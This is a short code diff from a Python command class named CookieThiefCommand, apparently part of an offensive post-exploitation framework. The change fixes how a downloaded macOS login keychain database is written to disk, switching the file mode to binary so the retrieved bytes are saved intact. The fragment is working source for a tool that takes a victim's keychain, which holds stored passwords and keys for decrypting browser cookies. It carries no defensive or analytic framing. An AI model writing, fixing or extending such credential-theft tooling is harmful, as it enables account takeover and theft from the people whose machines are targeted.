@@ -65,7 +65,7 @@ class CookieThiefCommand(CommandBase):
             print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
             sys.stdout.flush()
 
-        f = open("tmp_login.keychain-db", "w")
+        f = open("tmp_login.keychain-db", "wb")
         f.write(getkeychainDBResp["content"])
         f.close()
 
